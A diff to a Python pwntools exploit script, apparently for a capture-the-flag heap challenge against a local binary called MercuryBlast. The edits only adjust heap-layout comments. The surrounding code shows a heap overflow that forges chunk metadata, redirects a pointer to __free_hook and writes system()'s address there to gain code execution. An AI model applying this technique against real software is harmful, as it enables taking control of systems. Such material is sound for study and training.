@@ -64,7 +64,7 @@ def exp1():
     add_record("1.1", 0x100, "a") #0
     add_record("1.1", 0x100, "a") #1
 
-    ## |Record_0|Data_0|Record_1|Data_0|TOP_CHUNK
+    ## |Record_0|Description_0|Record_1|Description_1|TOP_CHUNK
     payload = b"a" * 0x100 + p64(0) + p64(0x21) + p64(0) + p64(0x1000)
     edit_record(0, "1.1", 0x200, payload)
     print_record()
@@ -94,6 +94,7 @@ def exp1():
     log.success(hex(free_hook_addr))
 
     ## chunk_1.description == free_hook
+    ## |Record_0|Description_0|Record_1|Description_1|TOP_CHUNK
     payload = b"a" * 0x100 + b"b" * 0x10 + p64(0) + p64(0x1000) + p64(free_hook_addr)
     edit_record(0, "1.1", 0x200, payload)
     edit_record(1, "1.1", 0x100, p64(sys_addr))
@@ -113,4 +114,4 @@ def exp2():
     
 p = process("./MercuryBlast")
 exp1()
-# exp2()
+#exp2()
